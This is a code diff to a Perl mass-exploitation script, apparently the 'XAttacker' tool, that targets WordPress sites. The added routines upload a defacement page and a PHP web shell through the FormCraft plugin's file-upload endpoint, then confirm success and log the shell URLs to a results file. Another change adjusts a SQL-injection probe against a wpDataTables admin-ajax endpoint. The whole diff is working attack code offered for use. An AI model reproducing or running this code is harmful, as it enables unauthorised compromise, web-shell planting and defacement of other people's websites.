@@ -154,6 +154,8 @@ if($cms =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools
     open(save, '>>tmp/Wordpress.txt');
     print save "$site\n"; 
     close(save);
+    right();
+    why();
     uploadify();
     gfupload();
     ffg();
@@ -263,6 +265,55 @@ print color('bold white'),"[$a] $site - ";
 }
 }
 
+sub right(){
+my $url = "$site/wp-content/plugins/formcraft/file-upload/server/content/upload.php";
+my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [file => ["XAttacker.html"],]);
+
+$advancedsliderup="$site/wp-content/plugins/formcraft/file-upload/server/content/files/";
+
+my $checkadvancedslider = $ua->get("$advancedsliderup")->content;
+if($checkadvancedslider =~/HaCKeD/) {
+
+print item(),"formindex";
+print color('bold white')," .................... ";
+print color('bold green'),"VULN\n";
+print item(),"index Uploaded Successfully\n";
+print color('bold white'),"  [Link] => $advancedsliderup\n";
+open (TEXT, '>>Result/Shells.txt');
+print TEXT "$advancedsliderup\n";
+close (TEXT);
+}else{
+print item(),"formindex";
+print color('bold white')," .................... ";
+print color('bold red'),"NOt VULN\n";
+}
+}
+
+
+sub why(){
+my $url = "$site/wp-content/plugins/formcraft/file-upload/server/content/upload.php";
+my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [file => ["XAttacker.php"],]);
+
+$advancedsliderup="$site/wp-content/plugins/formcraft/file-upload/server/content/files/";
+
+my $checkadvancedslider = $ua->get("$advancedsliderup")->content;
+if($checkadvancedslider =~/X Attacker/) {
+
+print item(),"formshell";
+print color('bold white')," .................... ";
+print color('bold green'),"VULN\n";
+print item(),"Shell Uploaded Successfully\n";
+print color('bold white'),"  [Link] => $advancedsliderup\n";
+open (TEXT, '>>Result/Shells.txt');
+print TEXT "$advancedsliderup\n";
+close (TEXT);
+}else{
+print item(),"formshell";
+print color('bold white')," .................... ";
+print color('bold red'),"NOt VULN\n";
+}
+}
+
 sub gfupload(){
 my $urls = "$site/index.php?gf_page=upload";
 my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [file => ["XAttacker.php"],]);
@@ -346,7 +397,7 @@ open (TEXT, '>>Result/Shells.txt');
 print TEXT "$addblockup\n";
 close (TEXT);
 }else{
-print item(),"   swfupload";
+print item(),"swfupload";
 print color('bold white')," ................... ";
 print color('bold red'),"NOt VULN\n";
 }
@@ -357,17 +408,17 @@ my $sqlitesterurl = "$site/wp-admin/admin-ajax.php?action=get_wdtable&amp;table_
 my $response = "$site/wp-admin/admin-ajax.php?action=get_wdtable&amp;table_id=1%27";
 my $checkaddblock = $ua->get("$response")->content;
 
-if($checkaddblock =~"mySQL error") {
-print item(),"SQLI wordpress Vuln";
+if($checkaddblock =~"mysql_fetch_array()") {
+print item(),"SQLwordpress";
 print color('bold white')," ................... ";
 print color('bold green'),"VULN\n";
-print item(),"Shell Uploaded Successfully\n";
+print item(),"found wp-admin SQL error\n";
 print color('bold white'),"  [Link] => $response\n";
 open (TEXT, '>>Result/Shells.txt');
 print TEXT "$response\n";
 close (TEXT);
 }else{
-print item(),"sql test";
+print item(),"SQLwordpress";
 print color('bold white')," ................... ";
 print color('bold red'),"NOt VULN\n";
 }
